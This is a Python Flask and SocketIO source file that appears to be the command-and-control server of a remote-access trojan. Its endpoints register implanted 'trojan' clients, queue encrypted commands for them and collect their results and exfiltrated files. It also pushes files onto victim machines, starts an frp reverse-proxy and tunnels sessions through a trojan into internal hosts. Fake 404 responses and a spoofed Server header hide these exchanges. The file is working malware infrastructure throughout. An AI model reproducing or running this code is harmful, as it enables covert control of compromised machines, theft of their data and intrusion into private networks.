# ============================
# 1. Monkey Patching
# ============================
import eventlet
eventlet.monkey_patch()

# ============================
# 2. 导入必要的模块
# ============================
from flask import Flask, Response, request, render_template, jsonify
from flask_socketio import SocketIO, emit
from lib.baseser import *
from lib.aes_crypt import *
from settings import *
from os import system
import time
import json
import urllib.parse
import hashlib  # 确保 md5 被正确导入
from base64 import b64decode, b64encode
from json import dumps, loads
import sys
import logging

# ============================
# 3. 初始化 Flask 和 SocketIO
# ============================
app = Flask(__name__)
app.config['SECRET_KEY'] = 'your_secret_key_here'  # 请替换为您的密钥
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

# ============================
# 4. 全局变量和实例
# ============================
get_payload_info = []
client_keys = {}
baseser = BaseSer()

# 管理session_id到trojan连接的映射
session_to_trojan = {}
session_to_client_sid = {}  # session_id对应的客户端的Socket.IO的sid
session_target_info = {}    # 保存session_id对应的target信息
trojan_list = []

# ============================
# 5. 配置日志记录
# ============================
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ============================
# 6. HTTP 路由部分
# ============================
@app.route("/updatekey", methods=["POST"])
def updatekey():

    data = request.get_json()
    if not data:
        return dumps({"info": "Request format error!"}), 400

    client_key = data.get("key")
    new_aes_key = data.get("new_aes_key")
    signature = data.get("signature")

    if not all([client_key, new_aes_key, signature]):
        return dumps({"info": "Incomplete parameters!"}), 400

    try:

        temp_aes_keys = baseser.aes_keys.copy()
        temp_aes_keys.update(baseser.temp_aes_keys)
        if client_key in temp_aes_keys:
            old_aes_key = temp_aes_keys[client_key]
            decrypted_signature = DataAesCrypt(old_aes_key, signature).decrypt()
            if decrypted_signature != client_key:
                return dumps({"info": "Invalid signature!"}), 403

            if baseser.update_aes_key(client_key, new_aes_key):
                return dumps({"info": "AES Key update successful!"}), 200
            else:
                return dumps({"info": "Update failed!"}), 500
        else:
            return dumps({"info": "The key is invalid!"}), 403
    except Exception as e:
        print(f"Update AES key error:{e}")
        return dumps({"info": "Internal server error!"}), 500


@app.route("/getkeys",methods=["POST","GET"])
def getkey():

    key = baseser.getkeys()
    print(f"[DEBUG] Generated key: {key}")


    rst = Response(render_template("index.html"))

    if key:
        try:

            if isinstance(key, dict):

                key = dumps(key)


            encoded_key = b64encode(key.encode("utf-8")).decode("utf-8")

            rst.headers['Cookie'] = encoded_key
            rst.status_code = 404
            rst.headers['Server'] = SERVER_AGET
        except Exception as e:
            print(f"Error encoding the key: {e}")
            rst.status_code = 200
            rst.headers["Server"] = SERVER_AGET
    else:
        rst.status_code = 200
        rst.headers["Server"] = SERVER_AGET

    return rst

@app.route('/fileupload',methods=["GET","POST"])
def upload_file():
    if request.form.get('pwd') == md5((PASSWORD+SALT_KEY).encode("utf-8")).hexdigest():
        file = request.files['file']
        hostkey = request.form.get('hostkey')
        hostcmd = request.form.get('cmd')
        targetpath = request.form.get('targetpath')
        print(hostkey, hostcmd)
        filename = file.filename
        file.save(f'./tmp/{filename}')
        print("成功保存")
        baseser.hostkey_to_filename[hostkey] = {'filename': filename, 'targetpath': targetpath}
    elif request.cookies.get("cid") and baseser.checkpwd(request.cookies.get('cid')):
        file = request.files['file']
        print("被控端上传的文件开始保存", file.filename)
        filename = file.filename
        file.save(f'./tmp/{filename}')
        print("成功保存")
    return "successful"

@app.route('/filedownload', methods=["GET", "POST"])
def download_file():
    if request.cookies.get("cid") and baseser.checkpwd(request.cookies.get('cid')):
        # 获取客户端提交的 hostkey 参数
        hostkey = request.cookies.get("cid")
        if not hostkey:
            return Response("Hostkey is required", status=400)
        
        file_info = baseser.hostkey_to_filename.get(hostkey)
        print("开始发送文件")

        if file_info:
            # 获取文件名和目标路径
            filename = file_info.get('filename')
            targetpath = file_info.get('targetpath')
            print(f"Filename: {filename}, Targetpath: {targetpath}")
        else:
            print(f"Hostkey {hostkey} not found.")
        
        if not filename:
            return Response("No file found for this hostkey", status=404)
        
        try:
            file_path = f'./tmp/{filename}'
            with open(file_path, 'rb') as f:
                file_data = f.read()

            # 使用urllib.parse.quote来对文件名进行URL编码
            encoded_filename = urllib.parse.quote(filename)
            encoded_targetpath= urllib.parse.quote(targetpath)

            # 设置响应头，确保文件名是有效的ASCII字符
            response = Response(open(file_path, 'rb').read())
            response.headers['Content-Disposition'] = f'attachment; filename="{encoded_filename}"; path="{encoded_targetpath}"'
            response.headers['Content-Type'] = 'application/octet-stream'
            
            return response
        
        except Exception as e:
            print(f"Error while sending file: {e}")
            return Response("Error while sending file", status=500)
    elif request.form.get('pwd') == md5((PASSWORD+SALT_KEY).encode("utf-8")).hexdigest():
        hostkey = request.form.get('hostkey')
        filename = baseser.file_names_dict.get(hostkey) + ".enc"
        file_path = f'./tmp/{filename}'
        with open(file_path, 'rb') as f:
            file_data = f.read()
        response = Response(open(file_path, 'rb').read())
        del baseser.file_names_dict[hostkey]
        return response

@app.route("/getname",methods=["GET","POST"])
def getpayloads():
    print("[DEBUG] 收到获取任务请求")
    
    if request.cookies:
        key = request.cookies.get("cid")
        print(f"[DEBUG] 客户端密钥: {key}")
        
        if baseser.checkpwd(key):
            print("[DEBUG] 密钥验证成功")
            t = baseser.get_payloads(key)
            
            # 创建用于日志的任务副本
            log_task = t.copy() if t else {}
            if 'file_data' in log_task:
                log_task['file_data'] = '[已加密的文件内容]'
            print(f"[DEBUG] 获取到任务: {log_task}")
            
            if t:
                temp = baseser.aes_keys.copy()
                temp.update(baseser.temp_aes_keys)
                
                try:
                    encrypted_data = DataAesCrypt(temp[key],dumps(t)).encrypt()
                    print(f"[DEBUG] 加密后的任务数据长度: {len(encrypted_data)}")
                    
                    # 返回JSON响应
                    return jsonify({
                        'status': 'success',
                        'data': encrypted_data
                    }), 404
                    
                except Exception as e:
                    print(f"[ERROR] 加密数据失败: {e}")
                    return jsonify({
                        'status': 'error',
                        'message': str(e)
                    }), 500
                
    return Response("", status=200)

@app.route("/addtask",methods=["POST"])
def addtask():
    print("[DEBUG] 收到添加任务请求")
    data = request.form
    if data and data.get('pwd') == md5((PASSWORD+SALT_KEY).encode("utf-8")).hexdigest():
        if data.get('key') and data.get('cmd'):
            print(f"[DEBUG] 添加任务 - key: {data.get('key')}")
            
            try:
                # 解码命令数据
                cmd_data = b64decode(data.get('cmd')).decode('utf-8')
                cmd_data = loads(cmd_data)
                if baseser.add_task(data.get('key'), cmd_data):
                    print("[DEBUG] 任务添加成功")
                    rst = dumps({"info":"Successfully added task!","key":data.get("key")})
                else:
                    print("[DEBUG] 任务添加失败")
                    rst = dumps({"info":"Failed to add task!","key":data.get("key")})
            except Exception as e:
                print(f"[ERROR] 任务处理错误: {e}")
                rst = dumps({"info":f"Error: {e}","key":data.get("key")})
        else:
            rst = dumps({"info":"Task information incomplete!","key":data.get("key")})
    else:
        rst = dumps({"info":"Authentication failed!","key":data.get("key")})
    return Response(rst)

@app.route("/getlivekeys", methods=["POST"])
def getlivekeys():

    data = request.get_json()
    if data and data.get("pwd") == md5((PASSWORD + SALT_KEY).encode("utf-8")).hexdigest():
        return dumps({"info": "success", "data": baseser.get_all_keys()}), 200
    else:
        return dumps({"info": "Password error"}), 403

@app.route("/addrst", methods=["POST"])
def addrst():
    print("[DEBUG] 收到结果上报请求")
    if request.cookies.get("cid") and baseser.checkpwd(request.cookies.get('cid')):
        try:
            data = request.form.get('data')
            print(data)
            if not data:
                print("[ERROR] 没有收到数据")
                return Response("No data received", status=400)
                
            client_key = request.cookies.get('cid')
            temp_aes_keys = baseser.aes_keys.copy()
            temp_aes_keys.update(baseser.temp_aes_keys)
            aes_key = temp_aes_keys.get(client_key)
            
            if not aes_key:
                print("[ERROR] 无效的客户端密钥")
                return Response("Invalid key", status=403)
            
            try:
                # 解密数据
                decrypted_data = DataAesCrypt(aes_key, data).decrypt()
                print(f"[DEBUG] 解密后数据大小: {len(decrypted_data)}")
                print("解密后的数据为", decrypted_data)
                
                # 解析JSON
                result_data = loads(decrypted_data)
                print("[DEBUG] JSON解析成功")
                
                if result_data.get('cdm') == 'download_file':
                    print("[DEBUG] 处理文件下载数据")
                    if 'file_data' not in result_data:
                        return Response("Missing file data", status=400)
                        
                    try:
                        file_data = result_data['file_data']
                        print(f"[DEBUG] 文件数据大小: {len(file_data)}")
                    except Exception as e:
                        print(f"[ERROR] 文件数据处理错误: {e}")
                        return Response("Invalid file data", status=400)
                
                # 添加结果
                if baseser.add_rst({'key': client_key, 'data': result_data}):
                    return Response("OK", status=404)
                    
                return Response("Failed to add result", status=500)
                
            except Exception as e:
                print(f"[ERROR] 数据处理错误: {e}")
                import traceback
                traceback.print_exc()
                return Response("Data processing error", status=500)
                
        except Exception as e:
            print(f"[ERROR] 请求处理错误: {e}")
            import traceback
            traceback.print_exc()
            
    return Response("Error", status=400)

@app.route("/getrst",methods=["GET","POST"])
def getrst():

    data = request.form or request.args
    c = 0
    data_dict = dict()

    if data and data.get("pwd") == md5((PASSWORD+SALT_KEY).encode("utf-8")).hexdigest():
        
        if get_payload_info:
            for i in get_payload_info:
              data_dict["info%s" % (c+1)] = i
              get_payload_info.remove(i)
            return dumps(data_dict)
        for i in baseser.rst_list:
            data_dict["target%s" % (c+1)] = i

            baseser.rst_list.remove(i)

        return dumps(data_dict)
    else:
        return dumps({"info":"Authentication failed!"})
@app.route("/getlive",methods=["GET","POST"])    
def getlive():

    rst = dict()
    pwd = request.form or request.args

    if pwd and pwd.get("pwd") == md5((PASSWORD+SALT_KEY).encode("utf-8")).hexdigest():
        print("into")
        print("length", len(baseser.online_list))
        for i in range(len(baseser.online_list)):
            rst["host-%s" % i] = baseser.online_list[i]
    else:
        rst = {"info":"keys error"}
    print(rst)
    return dumps({"data":rst})

@app.route("/killhost",methods=["GET","POST"])
def killhost():

    data = request.args or request.form
    if data and data.get("pwd") == md5((PASSWORD+SALT_KEY).encode("utf-8")).hexdigest():
        if data.get("key"):
            r = baseser.del_host_info(data.get("key"))
            if r:
              rst = {"info":"Delete successfully"}
            else:
              rst = {"info":"Delete failed!"}
        else:
            rst = {"info":"key error!"}
    else:
        rst = {"info":"keys error!"}
    return dumps(rst)

@app.route("/frpserver",methods=["GET","POST"])
def frpserver():

    data = request.args or request.form
    r = Response(render_template("index.html"))
    if data and data.get("pwd") == md5((PASSWORD+SALT_KEY).encode("utf-8")).hexdigest():
        if data.get("port"):
            p = str(int(data.get("port").strip()) + 1)

            with open("./software/frp/frps.ini","w",encoding="utf-8") as fp:
                fp.write("[common]\nbind_addr = 0.0.0.0\nbind_port = "+p.strip())

            system("ps -ef |grep frpserver |awk '{print $2}'|xargs |awk '{print $1}' |xargs kill -9")

            rst = system("nohup ./software/frp/frpserver -c ./software/frp/frps.ini &")

            if rst == 0:
                r.status_code = 404
            else:
                r.status_code = 200
        else:
            r.status_code = 200
    else:
        r.status_code = 200
    return r

@app.route("/file/upload", methods=["POST"])
def file_upload():
    if request.cookies.get("cid") and baseser.checkpwd(request.cookies.get('cid')):
        try:
            data = request.get_json()
            if not data:
                return Response("No data received", status=400)
                
            client_key = request.cookies.get('cid')
            
            # 处理文件信息
            if 'file_info' in data:

                baseser.staged_files[client_key] = {
                    'filename': data['file_info']['filename'],
                    'filesize': data['file_info']['filesize'],
                    'chunks': []
                }
                return Response("OK", status=200)
                
            # 处理文件块数据
            if 'chunk_data' in data:
                if client_key not in baseser.staged_files:
                    return Response("No file transfer initiated", status=400)
                    
                chunk = b64decode(data['chunk_data'])
                baseser.staged_files[client_key]['chunks'].append(chunk)
                
                # 检查是否接收完成
                total_size = sum(len(c) for c in baseser.staged_files[client_key]['chunks'])
                if total_size >= baseser.staged_files[client_key]['filesize']:
                    # 合并所有块
                    complete_file = b''.join(baseser.staged_files[client_key]['chunks'])
                    
                    # 添加到结果
                    result = {
                        'key': client_key,
                        'data': {
                            'cdm': 'download_file',
                            'file_data': b64encode(complete_file).decode('utf-8'),
                            'filename': baseser.staged_files[client_key]['filename']
                        }
                    }
                    baseser.add_rst(result)
                    
                    # 清理临时数据
                    del baseser.staged_files[client_key]
                    
                return Response("OK", status=200)
                
        except Exception as e:
            print(f"[ERROR] 文件上传处理错误: {e}")
            return Response(str(e), status=500)
            
    return Response("Unauthorized", status=403)

@app.route("/file/download", methods=["POST"]) 
def file_download():
    print("[DEBUG] 收到文件下载请求")
    
    if request.cookies.get("cid") and baseser.checkpwd(request.cookies.get('cid')):
        try:
            print("[DEBUG] 身份验证通过")
            file_data = request.form.get('file_data')
            
            if file_data:
                print(f"[DEBUG] 收到文件数据")
                # 解析JSON数据
                result = loads(file_data)
                
                # 直接使用原始的file_data，不做额外处理
                result = {
                    'key': request.cookies.get('cid'),
                    'data': result  # 保持原始数据结构
                }
                
                print("[DEBUG] 添加到结果列表")
                baseser.add_rst(result)
                return Response("OK", status=200)
            else:
                print("[DEBUG] 没有收到文件数据")
                return Response("No file data", status=400)
                
        except Exception as e:
            print(f"[DEBUG] 文件下载处理错误: {e}")
            return Response(f"Error: {e}", status=500)
    else:
        print("[DEBUG] 身份验证失败")
        return Response("Authentication failed", status=403)

# ============================
# 7. SocketIO 事件处理部分
# ============================

@socketio.on('connect')
def handle_connect():
    logger.info(f"WebSocket client connected: {request.sid}")


@socketio.on('disconnect')
def handle_disconnect():
    logger.info(f"WebSocket client disconnected: {request.sid}")
    # 清理session中映射的连接
    for s, tsid in list(session_to_trojan.items()):
        if tsid == request.sid:
            del session_to_trojan[s]
    for s, csid in list(session_to_client_sid.items()):
        if csid == request.sid:
            del session_to_client_sid[s]
    # 从trojan_list中移除
    if request.sid in trojan_list:
        trojan_list.remove(request.sid)


@socketio.on('start_session')
def handle_start_session(data):
    session_id = data.get('session_id')
    target_host = data.get('target_host')
    target_port = data.get('target_port')

    session_to_client_sid[session_id] = request.sid
    session_target_info[session_id] = (target_host, target_port)

    trojan_sid = get_any_trojan_sid()
    if trojan_sid:
        session_to_trojan[session_id] = trojan_sid
        socketio.emit('establish_internal_conn', {
            'session_id': session_id,
            'target_host': target_host,
            'target_port': target_port
        }, to=trojan_sid)
    else:
        emit('response_from_server', {
            'session_id': session_id,
            'payload': 'No trojan available'  # 改为字符串
        }, to=session_to_client_sid[session_id])


@socketio.on('data_from_client')
def handle_data_from_client(data):
    session_id = data.get('session_id')
    payload = data.get('payload', '')
    trojan_sid = session_to_trojan.get(session_id)
    print(f"[DEBUG] 收到来自client的数据: {payload}")
    if trojan_sid:
        socketio.emit('data_from_server', {
            'session_id': session_id,
            'payload': payload
        }, to=trojan_sid)


@socketio.on('end_session')
def handle_end_session(data):
    session_id = data.get('session_id')
    trojan_sid = session_to_trojan.get(session_id)
    if trojan_sid:
        socketio.emit('close_internal_conn', {
            'session_id': session_id
        }, to=trojan_sid)
    # 清理本地记录
    session_to_client_sid.pop(session_id, None)
    session_to_trojan.pop(session_id, None)
    session_target_info.pop(session_id, None)


@socketio.on('trojan_hello')
def handle_trojan_hello(data):
    # trojan向server注册自己
    logger.info(f"Trojan connected: {request.sid}")
    if request.sid not in trojan_list:
        trojan_list.append(request.sid)


@socketio.on('data_from_trojan')
def handle_data_from_trojan(data):
    session_id = data.get('session_id')
    payload = data.get('payload', '')
    client_sid = session_to_client_sid.get(session_id)
    if client_sid:
        socketio.emit('response_from_server', {
            'session_id': session_id,
            'payload': payload
        }, to=client_sid)


def get_any_trojan_sid():
    if trojan_list:
        return trojan_list[0]
    return None


@socketio.on('trojan_register')
def handle_trojan_register(data):
    if request.sid not in trojan_list:
        trojan_list.append(request.sid)
    emit('trojan_registered', {'status': 'ok'})


# ============================
# 8. 运行服务器
# ============================

if __name__ == "__main__":
    # 确保 SSL 证书和密钥路径正确
    try:
        # 启用 SSL 后，确保 cert.pem 和 key.pem 存在
        socketio.run(app, host="0.0.0.0", port=LOCAL_PORT,  keyfile="./cakey/key.pem", certfile="./cakey/cert.pem", debug=True)
    except TypeError as te:
        logger.error(f"TypeError: {te}")
        logger.error("请确认 socketio.run() 的参数是否正确。")
        sys.exit(1)
    except Exception as e:
        logger.error(f"Failed to start server: {e}")
        sys.exit(1)
